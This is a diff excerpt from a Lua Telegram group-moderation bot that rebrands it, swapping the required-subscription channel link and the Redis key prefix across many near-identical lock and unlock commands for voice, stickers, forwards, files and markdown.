-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:vico"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:vico"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصوت").lockKtm,"md",true)  
 return false
 end 
@@ -6377,10 +6380,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:vico"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:vico"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصوت").lockKick,"md",true)  
 return false
 end 
@@ -6389,10 +6392,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:vico"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:vico"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الصوت").unLock,"md",true)  
 return false
 end 
@@ -6401,10 +6404,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Keyboard"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكيبورد").Lock,"md",true)  
 return false
 end 
@@ -6413,10 +6416,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Keyboard"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكيبورد").lockKid,"md",true)  
 return false
 end 
@@ -6425,10 +6428,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Keyboard"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكيبورد").lockKtm,"md",true)  
 return false
 end 
@@ -6437,10 +6440,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Keyboard"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Keyboard"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الكيبورد").lockKick,"md",true)  
 return false
 end 
@@ -6449,10 +6452,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Keyboard"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Keyboard"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الكيبورد").unLock,"md",true)  
 return false
 end 
@@ -6461,10 +6464,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Sticker"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Sticker"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملصقات").Lock,"md",true)  
 return false
 end 
@@ -6473,10 +6476,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Sticker"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Sticker"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملصقات").lockKid,"md",true)  
 return false
 end 
@@ -6485,10 +6488,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Sticker"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Sticker"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملصقات").lockKtm,"md",true)  
 return false
 end 
@@ -6497,10 +6500,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Sticker"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Sticker"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملصقات").lockKick,"md",true)  
 return false
 end 
@@ -6509,10 +6512,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Sticker"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Sticker"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الملصقات").unLock,"md",true)  
 return false
 end 
@@ -6521,10 +6524,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:forward"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:forward"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التوجيه").Lock,"md",true)  
 return false
 end 
@@ -6533,10 +6536,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:forward"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:forward"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التوجيه").lockKid,"md",true)  
 return false
 end 
@@ -6545,10 +6548,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:forward"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:forward"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التوجيه").lockKtm,"md",true)  
 return false
 end 
@@ -6557,10 +6560,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:forward"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:forward"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل التوجيه").lockKick,"md",true)  
 return false
 end 
@@ -6569,10 +6572,10 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:forward"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:forward"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح التوجيه").unLock,"md",true)  
 return false
 end 
@@ -6581,10 +6584,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Document"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Document"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملفات").Lock,"md",true)  
 return false
 end 
@@ -6593,10 +6596,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Document"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Document"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملفات").lockKid,"md",true)  
 return false
 end 
@@ -6605,10 +6608,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Document"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Document"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملفات").lockKtm,"md",true)  
 return false
 end 
@@ -6617,10 +6620,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Document"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Document"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الملفات").lockKick,"md",true)  
 return false
 end 
@@ -6629,10 +6632,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Document"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Document"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الملفات").unLock,"md",true)  
 return false
 end 
@@ -6641,10 +6644,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Unsupported"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل السيلفي").Lock,"md",true)  
 return false
 end 
@@ -6653,10 +6656,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Unsupported"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل السيلفي").lockKid,"md",true)  
 return false
 end 
@@ -6665,10 +6668,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Unsupported"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل السيلفي").lockKtm,"md",true)  
 return false
 end 
@@ -6677,10 +6680,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Unsupported"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Unsupported"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل السيلفي").lockKick,"md",true)  
 return false
 end 
@@ -6689,10 +6692,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Unsupported"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Unsupported"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح السيلفي").unLock,"md",true)  
 return false
 end 
@@ -6701,10 +6704,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Markdaun"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الماركداون").Lock,"md",true)  
 return false
 end 
@@ -6713,10 +6716,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Markdaun"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Markdaun"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الماركداون").lockKid,"md",true)  
 return false
 end 
@@ -6725,10 +6728,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Markdaun"..msg_chat_id,"ktm")  
